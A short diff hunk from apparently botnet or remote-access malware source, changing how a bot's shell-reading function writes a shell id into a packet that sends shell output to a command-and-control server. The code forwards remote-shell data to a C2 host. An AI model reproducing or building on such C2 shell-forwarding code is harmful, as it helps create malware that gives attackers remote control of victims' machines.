@@ -73,7 +73,7 @@ bool laikaB_readShell(struct sLaika_bot *bot, struct sLaika_shell *_shell)
     if (rd > 0) {
         /* we read some input! send to cnc */
         laikaS_startVarPacket(peer, LAIKAPKT_SHELL_DATA);
-        laikaS_writeInt(sock, &shell->_shell.id, sizeof(uint32_t));
+        laikaS_writeu32(sock, shell->_shell.id);
         laikaS_write(sock, readBuf, rd);
         laikaS_endVarPacket(peer);
     } else if (rd == -1) {
